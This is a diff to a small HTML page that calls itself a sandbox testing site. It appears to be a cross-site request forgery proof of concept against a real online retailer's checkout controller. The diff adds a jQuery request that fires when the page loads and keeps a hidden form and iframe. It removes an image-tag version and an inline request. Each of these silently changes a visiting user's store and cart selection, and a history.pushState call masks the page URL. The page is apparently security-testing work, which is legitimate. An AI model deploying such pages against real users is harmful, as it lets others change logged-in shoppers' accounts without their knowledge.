@@ -6,6 +6,13 @@
   integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
   crossorigin="anonymous"></script>
   <script>
+	  jQuery(window).load(function(){
+	  	jQuery.ajax({
+			url: "https://www.bhphotovideo.com/bnh/controller/home?Q=json&O=&A=selectStore&stage=checkout&json=Y&location=store",
+			success: function(data){alert('successfully updated users cart selection')},
+			error: function(){alert('an error occurred')}
+		});
+	  });
 	function doJob(){
 		var child = window.open("https://www.bhphotovideo.com");
          setTimeout(function() {
@@ -18,9 +25,7 @@
 <body>
 	<p>HELLO! this is my sandbox testing site.</p>
 	<button onclick="doJob()">Try it out!</button>
-	
-	<img src="https://www.bhphotovideo.com/bnh/controller/home?Q=json&O=&A=selectStore&stage=checkout&json=Y&location=store" alt="img">
-	
+		
    <script>history.pushState('', '', '/')</script>
 	<iframe name="votar" style="display:none;"></iframe>
     <form id="myForm" action="https://www.bhphotovideo.com/bnh/controller/home">
@@ -32,12 +37,5 @@
       <input type="hidden" name="location" value="store" />
       <input type="submit" value="Submit request" />
     </form>
-	<script>
-		jQuery.ajax({
-			url: "https://www.bhphotovideo.com/bnh/controller/home?Q=json&O=&A=selectStore&stage=checkout&json=Y&location=store",
-			success: function(data){alert('successfully updated users cart selection')},
-			error: function(){alert('an error occurred')}
-		})
-	</script>
 </body>
 </html>
